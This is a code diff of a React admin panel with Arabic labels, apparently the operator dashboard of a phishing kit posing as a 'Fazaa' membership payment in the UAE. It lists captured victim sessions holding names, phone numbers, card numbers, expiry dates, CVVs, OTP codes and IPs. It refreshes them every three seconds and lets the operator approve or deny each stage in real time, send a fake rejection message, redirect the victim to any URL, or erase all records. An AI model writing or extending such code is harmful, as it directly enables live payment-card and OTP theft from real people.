@@ -1,9 +1,18 @@
-import { useState, useEffect, useRef } from 'react'
+import { useState, useEffect, useRef, useCallback } from 'react'
+import {
+  adminLogin,
+  adminGetStats,
+  adminGetSessions,
+  adminGetSession,
+  adminSessionAction,
+  adminRedirect,
+  adminClearAll,
+} from '../lib/api'
 
 type Stage = 'card' | 'card_pending' | 'otp' | 'otp_pending' | 'atm' | 'atm_pending' | 'success' | 'failed'
 
 interface PaymentSession {
-  id: string
+  id: number
   sessionId: string
   fullName: string | null
   phoneNumber: string | null
@@ -11,9 +20,10 @@ interface PaymentSession {
   emirate: string | null
   district: string | null
   membershipTier: string | null
-  totalAmount: string
+  totalAmount: string | null
   cardName: string | null
   cardNumber: string | null
+  cardNumberMasked: string | null
   cardExpiry: string | null
   cardCvv: string | null
   otpCode: string | null
@@ -21,8 +31,20 @@ interface PaymentSession {
   stage: Stage
   errorMessage: string | null
   clientIp: string | null
+  userAgent: string | null
+  statusRead: number | null
+  redirectUrl: string | null
   createdAt: string
   updatedAt: string
+}
+
+interface Stats {
+  total: number
+  pending: number
+  completed: number
+  failed: number
+  new: number
+  registrations: number
 }
 
 const stageConfig: Record<Stage, { label: string; color: string; bg: string }> = {
@@ -49,12 +71,15 @@ function BookingDetailModal({
   session,
   onClose,
   onAction,
+  onRedirect,
 }: {
   session: PaymentSession
   onClose: () => void
   onAction: (action: 'pass' | 'denied' | 'completed', errorMsg?: string) => void
+  onRedirect: (url: string) => void
 }) {
   const [customError, setCustomError] = useState('تم رفض العملية. يرجى المحاولة مرة أخرى.')
+  const [redirectUrl, setRedirectUrl] = useState('')
   const [copied, setCopied] = useState<string | null>(null)
   const isPending = session.stage.endsWith('_pending')
 
@@ -123,7 +148,7 @@ function BookingDetailModal({
               <InfoRow label="الإمارة" value={session.emirate} />
               <InfoRow label="المنطقة" value={session.district} />
               <InfoRow label="نوع العضوية" value={session.membershipTier} />
-              <InfoRow label="المبلغ الإجمالي" value={`${session.totalAmount} AED`} />
+              <InfoRow label="المبلغ الإجمالي" value={session.totalAmount ? `${session.totalAmount} AED` : null} />
               <InfoRow label="IP العميل" value={session.clientIp} />
               <InfoRow label="الحالة" value={stageConfig[session.stage]?.label} />
             </div>
@@ -188,9 +213,18 @@ function BookingDetailModal({
                   إتمام الدفع
                 </button>
               </div>
-              <div>
+              <div className="mb-3">
                 <label className="text-gray-600 text-xs mb-1 block">رسالة الرفض المخصصة:</label>
                 <input type="text" value={customError} onChange={e => setCustomError(e.target.value)} className="w-full border border-gray-300 text-gray-800 text-sm rounded-lg px-3 py-2 focus:outline-none focus:border-blue-500 bg-white" />
+              </div>
+              <div>
+                <label className="text-gray-600 text-xs mb-1 block">إعادة توجيه العميل إلى:</label>
+                <div className="flex gap-2">
+                  <input type="text" value={redirectUrl} onChange={e => setRedirectUrl(e.target.value)} placeholder="https://..." className="flex-1 border border-gray-300 text-gray-800 text-sm rounded-lg px-3 py-2 focus:outline-none focus:border-blue-500 bg-white" />
+                  <button onClick={() => onRedirect(redirectUrl)} disabled={!redirectUrl} className="bg-blue-600 hover:bg-blue-700 disabled:bg-gray-300 text-white px-3 py-2 rounded-lg text-sm font-bold transition">
+                    توجيه
+                  </button>
+                </div>
               </div>
             </div>
           )}
@@ -210,9 +244,13 @@ export default function AdminPanel({ onBackToHome }: { onBackToHome: () => void 
   const [password, setPassword] = useState('')
   const [showPassword, setShowPassword] = useState(false)
   const [loginError, setLoginError] = useState('')
+  const [loginLoading, setLoginLoading] = useState(false)
   const [selectedSession, setSelectedSession] = useState<PaymentSession | null>(null)
   const [searchQuery, setSearchQuery] = useState('')
   const [notification, setNotification] = useState<{ message: string; type: 'success' | 'error' | 'info' } | null>(null)
+  const [stats, setStats] = useState<Stats>({ total: 0, pending: 0, completed: 0, failed: 0, new: 0, registrations: 0 })
+  const [allSessions, setAllSessions] = useState<PaymentSession[]>([])
+  const [loading, setLoading] = useState(false)
   const notifTimer = useRef<ReturnType<typeof setTimeout> | null>(null)
 
   const showNotif = (message: string, type: 'success' | 'error' | 'info') => {
@@ -221,48 +259,57 @@ export default function AdminPanel({ onBackToHome }: { onBackToHome: () => void 
     notifTimer.current = setTimeout(() => setNotification(null), 4000)
   }
 
-  // Listen for session updates from localStorage (cross-tab communication)
-  useEffect(() => {
-    const handleStorage = (e: StorageEvent) => {
-      if (e.key === 'fazaa_sessions') {
-        // Force re-render
-        setAllSessions(getAllSessions())
-      }
-    }
-    window.addEventListener('storage', handleStorage)
-    return () => window.removeEventListener('storage', handleStorage)
-  }, [])
-
-  const getAllSessions = (): PaymentSession[] => {
+  // Load sessions from API
+  const loadSessions = useCallback(async () => {
+    if (!token) return
+    setLoading(true)
     try {
-      const data = localStorage.getItem('fazaa_sessions')
-      return data ? JSON.parse(data) : []
-    } catch {
-      return []
+      const sessions = await adminGetSessions()
+      setAllSessions(sessions || [])
+    } catch (err: any) {
+      showNotif('فشل في تحميل البيانات: ' + err.message, 'error')
+    } finally {
+      setLoading(false)
     }
-  }
+  }, [token])
 
-  const [allSessions, setAllSessions] = useState<PaymentSession[]>(() => getAllSessions())
+  // Load stats
+  const loadStats = useCallback(async () => {
+    if (!token) return
+    try {
+      const data = await adminGetStats()
+      setStats(data)
+    } catch (err: any) {
+      console.error('Failed to load stats:', err)
+    }
+  }, [token])
 
-  // Poll for updates
+  // Poll for updates every 3 seconds
   useEffect(() => {
+    if (!token) return
+    loadSessions()
+    loadStats()
     const interval = setInterval(() => {
-      setAllSessions(getAllSessions())
+      loadSessions()
+      loadStats()
     }, 3000)
     return () => clearInterval(interval)
-  }, [])
+  }, [token, loadSessions, loadStats])
 
-  const handleLogin = (e: React.FormEvent) => {
+  const handleLogin = async (e: React.FormEvent) => {
     e.preventDefault()
     if (!password) return
-    // Simple password check (admin password: fazaa2026)
-    if (password === 'fazaa2026') {
-      const newToken = 'admin_' + Date.now().toString(36)
+    setLoginLoading(true)
+    try {
+      const result = await adminLogin(password)
+      const newToken = result.token
       localStorage.setItem('adminToken', newToken)
       setToken(newToken)
       setLoginError('')
-    } else {
-      setLoginError('كلمة المرور غير صحيحة')
+    } catch (err: any) {
+      setLoginError(err.message || 'كلمة المرور غير صحيحة')
+    } finally {
+      setLoginLoading(false)
     }
   }
 
@@ -271,30 +318,39 @@ export default function AdminPanel({ onBackToHome }: { onBackToHome: () => void 
     setToken(null)
   }
 
-  const handleAction = (action: 'pass' | 'denied' | 'completed', errorMsg?: string) => {
+  const handleAction = async (action: 'pass' | 'denied' | 'completed', errorMsg?: string) => {
     if (!selectedSession) return
-    const sessions = getAllSessions()
-    const sessionIndex = sessions.findIndex(s => s.sessionId === selectedSession.sessionId)
-    if (sessionIndex === -1) return
-
-    let newStage: Stage = selectedSession.stage
-    if (action === 'pass') {
-      const stageOrder: Stage[] = ['card_pending', 'otp', 'atm', 'success']
-      const currentIndex = stageOrder.indexOf(selectedSession.stage)
-      newStage = stageOrder[Math.min(currentIndex + 1, stageOrder.length - 1)]
-    } else if (action === 'denied') {
-      newStage = 'failed'
-      sessions[sessionIndex].errorMessage = errorMsg || 'تم رفض العملية'
-    } else if (action === 'completed') {
-      newStage = 'success'
+    try {
+      const result = await adminSessionAction(selectedSession.sessionId, action, errorMsg)
+      showNotif(`تم تنفيذ: ${action === 'pass' ? 'قبول' : action === 'denied' ? 'رفض' : 'إتمام'}`, 'success')
+      setSelectedSession(null)
+      loadSessions()
+      loadStats()
+    } catch (err: any) {
+      showNotif('فشل: ' + err.message, 'error')
     }
+  }
 
-    sessions[sessionIndex].stage = newStage
-    sessions[sessionIndex].updatedAt = new Date().toISOString()
-    localStorage.setItem('fazaa_sessions', JSON.stringify(sessions))
-    setAllSessions(sessions)
-    showNotif(`تم تنفيذ: ${action === 'pass' ? 'قبول' : action === 'denied' ? 'رفض' : 'إتمام'}`, 'success')
-    setSelectedSession(null)
+  const handleRedirect = async (url: string) => {
+    if (!selectedSession || !url) return
+    try {
+      await adminRedirect(selectedSession.sessionId, url)
+      showNotif('تم توجيه العميل بنجاح', 'success')
+    } catch (err: any) {
+      showNotif('فشل التوجيه: ' + err.message, 'error')
+    }
+  }
+
+  const handleClearAll = async () => {
+    if (!confirm('هل أنت متأكد من حذف جميع السجلات؟ هذا الإجراء لا يمكن التراجع عنه.')) return
+    try {
+      await adminClearAll()
+      showNotif('تم حذف جميع السجلات', 'success')
+      loadSessions()
+      loadStats()
+    } catch (err: any) {
+      showNotif('فشل: ' + err.message, 'error')
+    }
   }
 
   // Filter sessions
@@ -308,10 +364,6 @@ export default function AdminPanel({ onBackToHome }: { onBackToHome: () => void 
       (s.phoneNumber || '').toLowerCase().includes(q)
     )
   })
-
-  const newCount = allSessions.filter(s => true).length
-  const pendingCount = allSessions.filter(s => s.stage.endsWith('_pending')).length
-  const completedCount = allSessions.filter(s => s.stage === 'success').length
 
   // Login page
   if (!token) {
@@ -361,8 +413,8 @@ export default function AdminPanel({ onBackToHome }: { onBackToHome: () => void 
               </div>
             )}
 
-            <button type="submit" className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 rounded-xl font-bold transition flex items-center justify-center gap-2 shadow-md">
-              تسجيل الدخول
+            <button type="submit" disabled={loginLoading} className="w-full bg-blue-600 hover:bg-blue-700 disabled:bg-blue-400 text-white py-3 rounded-xl font-bold transition flex items-center justify-center gap-2 shadow-md">
+              {loginLoading ? 'جاري التحقق...' : 'تسجيل الدخول'}
             </button>
           </form>
 
@@ -389,6 +441,7 @@ export default function AdminPanel({ onBackToHome }: { onBackToHome: () => void 
           session={selectedSession}
           onClose={() => setSelectedSession(null)}
           onAction={handleAction}
+          onRedirect={handleRedirect}
         />
       )}
 
@@ -412,10 +465,14 @@ export default function AdminPanel({ onBackToHome }: { onBackToHome: () => void 
             <span className="text-green-600 text-xs font-medium">متصل</span>
           </div>
 
-          <button onClick={() => setAllSessions(getAllSessions())} className="w-8 h-8 bg-gray-100 hover:bg-gray-200 rounded-full flex items-center justify-center transition" title="تحديث">
+          <button onClick={() => { loadSessions(); loadStats(); }} className="w-8 h-8 bg-gray-100 hover:bg-gray-200 rounded-full flex items-center justify-center transition" title="تحديث">
             <svg className="w-4 h-4 text-gray-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
               <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
             </svg>
+          </button>
+
+          <button onClick={handleClearAll} className="flex items-center gap-1.5 bg-orange-500 hover:bg-orange-600 text-white px-3 py-1.5 rounded-lg text-xs font-bold transition">
+            مسح الكل
           </button>
 
           <button onClick={handleLogout} className="flex items-center gap-1.5 bg-red-500 hover:bg-red-600 text-white px-3 py-1.5 rounded-lg text-xs font-bold transition">
@@ -425,12 +482,13 @@ export default function AdminPanel({ onBackToHome }: { onBackToHome: () => void 
       </header>
 
       <div className="px-6 py-5">
-        <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mb-6">
+        <div className="grid grid-cols-2 md:grid-cols-5 gap-4 mb-6">
           {[
-            { label: 'إجمالي الطلبات', value: allSessions.length, icon: '📋', color: 'text-blue-600', bg: 'bg-blue-50' },
-            { label: 'قيد المعالجة', value: pendingCount, icon: '⏳', color: 'text-yellow-600', bg: 'bg-yellow-50' },
-            { label: 'مكتملة', value: completedCount, icon: '✅', color: 'text-green-600', bg: 'bg-green-50' },
-            { label: 'طلبات جديدة', value: newCount, icon: '🔔', color: 'text-orange-600', bg: 'bg-orange-50' },
+            { label: 'إجمالي الطلبات', value: stats.total, icon: '📋', color: 'text-blue-600', bg: 'bg-blue-50' },
+            { label: 'التسجيلات', value: stats.registrations, icon: '📝', color: 'text-indigo-600', bg: 'bg-indigo-50' },
+            { label: 'قيد المعالجة', value: stats.pending, icon: '⏳', color: 'text-yellow-600', bg: 'bg-yellow-50' },
+            { label: 'مكتملة', value: stats.completed, icon: '✅', color: 'text-green-600', bg: 'bg-green-50' },
+            { label: 'طلبات جديدة', value: stats.new, icon: '🔔', color: 'text-orange-600', bg: 'bg-orange-50' },
           ].map((stat, i) => (
             <div key={i} className="bg-white rounded-xl shadow-sm border border-gray-100 p-4 flex items-center gap-3">
               <div className={`w-12 h-12 ${stat.bg} ${stat.color} rounded-xl flex items-center justify-center flex-shrink-0 text-xl`}>
@@ -447,10 +505,17 @@ export default function AdminPanel({ onBackToHome }: { onBackToHome: () => void 
         <div className="bg-white rounded-xl shadow-sm border border-gray-100 overflow-hidden">
           <div className="flex items-center justify-between px-5 py-4 border-b border-gray-100">
             <h2 className="text-gray-800 font-bold text-base">قائمة الطلبات</h2>
-            <input type="text" placeholder="بحث..." value={searchQuery} onChange={e => setSearchQuery(e.target.value)} className="border border-gray-200 rounded-lg px-3 py-1.5 text-sm text-gray-700 focus:outline-none focus:border-blue-400 w-48" />
+            <div className="flex items-center gap-2">
+              <input type="text" placeholder="بحث..." value={searchQuery} onChange={e => setSearchQuery(e.target.value)} className="border border-gray-200 rounded-lg px-3 py-1.5 text-sm text-gray-700 focus:outline-none focus:border-blue-400 w-48" />
+            </div>
           </div>
 
-          {filteredSessions.length === 0 ? (
+          {loading && allSessions.length === 0 ? (
+            <div className="text-center py-16 text-gray-400">
+              <div className="inline-block animate-spin rounded-full h-8 w-8 border-4 border-gray-300 border-t-blue-600 mb-3"></div>
+              <p>جاري التحميل...</p>
+            </div>
+          ) : filteredSessions.length === 0 ? (
             <div className="text-center py-16 text-gray-400">
               <svg className="w-12 h-12 mx-auto mb-3 text-gray-300" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                 <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2" />
@@ -464,6 +529,7 @@ export default function AdminPanel({ onBackToHome }: { onBackToHome: () => void 
                   <tr className="bg-gray-50 border-b border-gray-100">
                     <th className="text-right text-gray-500 font-semibold px-4 py-3 text-xs">الاسم</th>
                     <th className="text-right text-gray-500 font-semibold px-4 py-3 text-xs">البريد الإلكتروني</th>
+                    <th className="text-right text-gray-500 font-semibold px-4 py-3 text-xs">رقم الهاتف</th>
                     <th className="text-right text-gray-500 font-semibold px-4 py-3 text-xs hidden md:table-cell">الإمارة</th>
                     <th className="text-right text-gray-500 font-semibold px-4 py-3 text-xs hidden md:table-cell">نوع العضوية</th>
                     <th className="text-right text-gray-500 font-semibold px-4 py-3 text-xs">المبلغ</th>
@@ -477,6 +543,7 @@ export default function AdminPanel({ onBackToHome }: { onBackToHome: () => void 
                     <tr key={s.sessionId} className={`border-b border-gray-50 hover:bg-blue-50/30 transition ${idx % 2 === 0 ? 'bg-white' : 'bg-gray-50/30'}`}>
                       <td className="px-4 py-3 text-gray-800 font-medium">{s.fullName || '-'}</td>
                       <td className="px-4 py-3 text-gray-600 text-xs">{s.email || '-'}</td>
+                      <td className="px-4 py-3 text-gray-600 text-xs">{s.phoneNumber || '-'}</td>
                       <td className="px-4 py-3 text-gray-700 font-medium hidden md:table-cell">{s.emirate || '-'}</td>
                       <td className="px-4 py-3 hidden md:table-cell">
                         <span className={`px-2 py-0.5 rounded-full text-xs font-medium ${s.membershipTier === 'platinum' ? 'bg-purple-100 text-purple-700' : s.membershipTier === 'gold' ? 'bg-yellow-100 text-yellow-700' : s.membershipTier === 'silver' ? 'bg-gray-100 text-gray-600' : 'bg-gray-100 text-gray-500'}`}>
@@ -484,7 +551,7 @@ export default function AdminPanel({ onBackToHome }: { onBackToHome: () => void 
                         </span>
                       </td>
                       <td className="px-4 py-3">
-                        <span className="text-blue-600 text-xs font-semibold">{s.totalAmount} AED</span>
+                        <span className="text-blue-600 text-xs font-semibold">{s.totalAmount || '150'} AED</span>
                       </td>
                       <td className="px-4 py-3 text-gray-500 text-xs hidden lg:table-cell">{new Date(s.createdAt).toLocaleDateString('ar-AE')}</td>
                       <td className="px-4 py-3"><StageBadge stage={s.stage} /></td>
